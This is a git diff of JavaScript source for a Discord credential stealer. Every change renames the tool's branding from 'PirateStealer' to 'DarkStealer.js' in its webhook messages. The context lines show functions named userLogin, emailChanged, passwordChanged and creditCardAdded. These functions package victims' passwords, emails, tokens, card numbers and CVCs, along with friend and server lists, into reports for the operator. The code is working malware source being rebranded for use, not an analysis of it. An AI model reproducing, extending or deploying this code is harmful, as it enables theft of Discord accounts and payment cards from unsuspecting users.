@@ -112,7 +112,7 @@ async function firstTime() {
             fs.rmdirSync(path.join(__dirname, "init"));
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "PirateStealer",
+                    username: "DarkStealer.js",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized (User not Logged in)",
@@ -123,10 +123,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "DarkStealer.js"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "DarkStealer.js"
                         }
                     }]
                 };
@@ -134,7 +134,7 @@ async function firstTime() {
             } else {
                 var b = await getUserInfo(token)
                 var c = {
-                    username: "PirateStealer",
+                    username: "DarkStealer.js",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized",
@@ -162,10 +162,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "DarkStealer.js"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "DarkStealer.js"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -187,7 +187,7 @@ async function firstTime() {
         if (config['logout-notify'] == "true") {
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "PirateStealer",
+                    username: "DarkStealer.js",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User log out (User not Logged in before)",
@@ -198,10 +198,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "DarkStealer.js"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "DarkStealer.js"
                         }
                     }]
                 };
@@ -209,7 +209,7 @@ async function firstTime() {
             } else {
                 const b = await getUserInfo(token);
                 var c = {
-                    username: "PirateStealer",
+                    username: "DarkStealer.js",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User got logged out",
@@ -237,10 +237,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "DarkStealer.js"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "DarkStealer.js"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -310,7 +310,7 @@ async function userLogin(password, email, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "PirateStealer",
+        username: "DarkStealer.js",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "User Login",
@@ -354,10 +354,10 @@ async function userLogin(password, email, token) {
                 inline: !1
             },],
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -367,10 +367,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -381,10 +381,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "description": servers.message,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -400,10 +400,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             }
         }
         params.embeds.push(embed)
@@ -419,7 +419,7 @@ async function emailChanged(password, newEmail, token) {
 
 
     var params = {
-        username: "PirateStealer",
+        username: "DarkStealer.js",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Email Changed",
@@ -459,10 +459,10 @@ async function emailChanged(password, newEmail, token) {
                 inline: !1
             },],
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -472,10 +472,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -490,10 +490,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             }
         }
         params.embeds.push(embed)
@@ -508,7 +508,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "PirateStealer",
+        username: "DarkStealer.js",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Password Changed",
@@ -556,10 +556,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
                 inline: !1
             },],
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -569,10 +569,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -582,10 +582,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "description": servers.message,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -602,10 +602,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             }
         }
         params.embeds.push(embed)
@@ -619,7 +619,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "PirateStealer",
+        username: "DarkStealer.js",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Credit Card",
@@ -673,10 +673,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
             },
             ],
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -686,10 +686,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "DarkStealer.js"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "DarkStealer.js"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
